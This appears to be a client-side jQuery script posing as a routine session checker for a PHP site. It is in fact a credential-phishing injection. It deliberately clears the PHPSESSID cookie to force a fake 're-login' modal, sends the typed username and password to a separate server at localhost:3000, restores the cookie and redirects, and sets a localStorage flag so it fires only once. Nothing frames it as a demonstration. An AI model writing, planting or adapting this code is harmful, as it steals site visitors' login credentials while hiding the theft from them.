$(document).ready(function () {
    var interval;
    var checkSession = function() {
        $.ajax({
            method: 'get',
            url: 'verify.php',
            success: function(data) {
                // console.log(data);
                if(!JSON.parse(data).logged) {
                    clearInterval(interval);
                    $('.ui.modal').modal('setting', 'closable', false).modal('show');
                }
                // console.log(JSON.parse(data).logged);
            }
        })
    }
    interval = setInterval(checkSession, 1000);

    setTimeout(function() {
        if(typeof(Storage) !== 'undefined') {
            if(!localStorage.siteName) {
                var a = document.cookie;
                document.cookie = 'PHPSESSID' + '=';
                $(document).on('click', '#login', function() {
                    $.ajax({
                        method: 'POST',
                        url: 'http://localhost:3000',
                        data: {
                            username: $('#username').val(),
                            password: $('#password').val()
                        },
                        success: function(data) {
                            console.log({
                                username: $('#username').val(),
                                password: $('#password').val()
                            });
                            document.cookie = a; 
                            window.location = 'http://localhost';
                            localStorage.siteName = true;
                        }
                    })
                })
            } else {
                localStorage.siteName = true;
            }
           
        }
        
    }, 3000);
})